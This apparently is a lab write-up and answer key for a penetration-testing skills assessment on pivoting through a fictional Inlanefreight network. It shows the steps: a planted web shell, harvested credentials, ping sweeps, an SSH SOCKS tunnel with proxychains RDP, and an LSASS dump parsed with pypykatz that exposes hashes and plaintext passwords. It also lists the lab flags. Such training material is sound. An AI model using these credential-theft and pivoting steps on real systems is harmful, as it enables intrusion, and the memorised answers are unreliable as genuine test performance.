# Skills Assessment - Pivoting, Tunneling, and Port Forwarding
## Scenario
A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are below:

## Objectives
- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated flag.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.

## Questions
1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer. **Answer: webadmin**
   - Connect to the webshell via a browser
   - Look at the `/home` notice suspicious file at `/home/webadmin/for-admin-eyes-only`
2. Submit the credentials found in the user's home directory. (Format: user:password) **Answer: mlefay:Plain Human work!**
   - Read the file `/home/webadmin/for-admin-eyes-only`
3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer. **Answer: 172.16.5.35**
   - Notice that this host is attached to an internal network 172.16.0.0/16:
      ```sh
      www-data@inlanefreight.local:/home/webadmin# ip a
      1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
          link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
          inet 127.0.0.1/8 scope host lo
            valid_lft forever preferred_lft forever
          inet6 ::1/128 scope host
            valid_lft forever preferred_lft forever
      2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
          link/ether 00:50:56:b0:ff:ca brd ff:ff:ff:ff:ff:ff
          inet 10.129.229.129/16 brd 10.129.255.255 scope global dynamic ens160
            valid_lft 2585sec preferred_lft 2585sec
          inet6 dead:beef::250:56ff:feb0:ffca/64 scope global dynamic mngtmpaddr
            valid_lft 86399sec preferred_lft 14399sec
          inet6 fe80::250:56ff:feb0:ffca/64 scope link
            valid_lft forever preferred_lft forever
      3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
          link/ether 00:50:56:b0:ec:b0 brd ff:ff:ff:ff:ff:ff
          inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
            valid_lft forever preferred_lft forever
          inet6 fe80::250:56ff:feb0:ecb0/64 scope link
            valid_lft forever preferred_lft forever
      ```
   - Try to do ping sweep on the 172.16.5.0/24 subnet → 172.16.5.35 is reachable:
      ```sh
      www-data@inlanefreight.local:/home/webadmin# bash -c 'for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done'
      64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.020 ms
      64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=1.57 ms
      ```
4. Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer. **Answer: S1ngl3-Piv07-3@sy-Day**
   - From the webshell copy the `id_rsa` to our attack host
   - Enable dynamic port forwarding with SSH:
      ```sh
      $ ssh -D 9050 -i id_rsa webadmin@10.129.229.129
      ```
   - RDP to the discovered host (172.16.5.35) through the proxychain and read the flag at `C:\Flag.txt`:
      ```sh
      $ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work! /drive:linux,/home/htb-ac-xxx/Downloads'
      ```
5. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable? **Answer: vfrank**
   - On the RDP session, dump the LSASS process memory and transfer it to attack host to extract credentials using `pypykatz`:
      ```sh
      $ pypykatz lsa minidump lsass.dmp
      <SNIP>
      == LogonSession ==
      authentication_id 164542 (282be)
      session_id 0
      username vfrank
      domainname INLANEFREIGHT
      logon_server ACADEMY-PIVOT-D
      logon_time 2026-03-11T04:04:28.223579+00:00
      sid S-1-5-21-3858284412-1730064152-742000644-1103
      luid 164542
        == MSV ==
          Username: vfrank
          Domain: INLANEFREIGHT
          LM: NA
          NT: 2e16a00be74fa0bf862b4256d0347e83
          SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
          DPAPI: 97ead6d940822b2c57b18885ffcc5fb400000000
        == WDIGEST [282be]==
          username vfrank
          domainname INLANEFREIGHT
          password None
          password (hex)
        == Kerberos ==
          Username: vfrank
          Domain: INLANEFREIGHT.LOCAL
          Password: Imply wet Unmasked!
          password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
        == WDIGEST [282be]==
          username vfrank
          domainname INLANEFREIGHT
          password None
          password (hex)
        == DPAPI [282be]==
          luid 164542
          key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
          masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
          sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5
      <SNIP>
      ```
    - `vfrank`'s password is stored in plaintext under Kerberos section: `Imply wet Unmasked!`
6. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation. **Answer: N3tw0rk-H0pp1ng-f0R-FuN**
   - Notice the Windows host is attached to another internal network (172.16.6.0/16):
      ```cmd
      C:\Users\mlefay>ipconfig

      Windows IP Configuration


      Ethernet adapter Ethernet0:

        Connection-specific DNS Suffix  . :
        Link-local IPv6 Address . . . . . : fe80::5c2d:3207:cc2f:b7f5%4
        IPv4 Address. . . . . . . . . . . : 172.16.5.35
        Subnet Mask . . . . . . . . . . . : 255.255.0.0
        Default Gateway . . . . . . . . . : 172.16.5.1

      Ethernet adapter Ethernet1 2:

        Connection-specific DNS Suffix  . :
        Link-local IPv6 Address . . . . . : fe80::fde7:824a:1e63:8425%5
        IPv4 Address. . . . . . . . . . . : 172.16.6.35
        Subnet Mask . . . . . . . . . . . : 255.255.0.0
        Default Gateway . . . . . . . . . :
      ```
   - Run a ping sweep from the Windows host (172.16.5.35) and discovered another reachable host: 172.16.6.25
      ```pwsh
      PS C:\Users\mlefay>1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
      <SNIP>
      172.16.6.25: True
      <SNIP>
      ```
   - From the Windows host RDP to 172.16.6.25 using `vfrank`:`Imply wet Unmasked!`
7. Submit the contents of C:\Flag.txt located on the Domain Controller. **Answer: 3nd-0xf-Th3-R@inbow!**
   - From the RDP session at Windows host 172.16.6.25, browse to `AutomateDCAdmin` share and read the flag